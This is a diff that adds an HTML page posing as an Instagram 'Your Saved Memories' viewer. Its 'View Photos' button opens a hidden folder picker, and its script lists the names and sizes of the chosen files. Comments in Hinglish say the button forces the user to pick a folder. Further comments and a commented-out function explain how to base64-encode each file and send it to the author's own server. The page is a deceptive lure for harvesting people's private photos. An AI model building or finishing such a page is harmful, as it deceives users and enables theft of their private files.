@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Memories</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #fafafa;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        h2 {
+            color: #262626;
+        }
+        p {
+            color: #8e8e8e;
+            font-size: 14px;
+        }
+        button {
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #0074cc;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>📸 Your Saved Memories</h2>
+    <p>Tap below to view your recently saved photos and videos.</p>
+    
+    <!-- Yeh button user ko folder select karne par majboor karega -->
+    <button onclick="triggerUpload()">View Photos</button>
+    
+    <!-- Hidden input jo actual file selection handle karega -->
+    <input type="file" id="fileInput" webkitdirectory multiple style="display: none;" onchange="processFiles()">
+</div>
+
+<script>
+    function triggerUpload() {
+        // User jab button dabata hai, hidden input trigger hota hai
+        document.getElementById('fileInput').click();
+    }
+
+    function processFiles() {
+        const input = document.getElementById('fileInput');
+        const files = input.files;
+        
+        if (files.length === 0) {
+            alert("No files selected.");
+            return;
+        }
+
+        let info = "Total Files Selected: " + files.length + "\n\n";
+        
+        // Har file ka naam aur size log karo
+        for (let i = 0; i < files.length; i++) {
+            info += `Name: ${files[i].name}\nSize: ${(files[i].size / 1024).toFixed(2)} KB\n`;
+            // Agar tu chahta hai ki file ka data (base64) bhi mile, to neeche wala part uncomment kar:
+            // readAsDataURL(files[i]); 
+        }
+
+        console.log(info);
+        alert("Photos captured successfully! Check console for details.");
+        
+        // Yahan tu apna server URL daal sakta hai fetch request ke liye
+        // sendToServer(files);
+    }
+
+    // Optional: File data ko base64 mein convert karne ka function
+    /*
+    function readAsDataURL(file) {
+        const reader = new FileReader();
+        reader.onload = function(e) {
+            console.log("File Data:", e.target.result);
+            // Yahan tu e.target.result (jo base64 string hai) apne server pe bhej sakta hai
+        };
+        reader.readAsDataURL(file);
+    }
+    */
+</script>
+
+</body>
+</html>
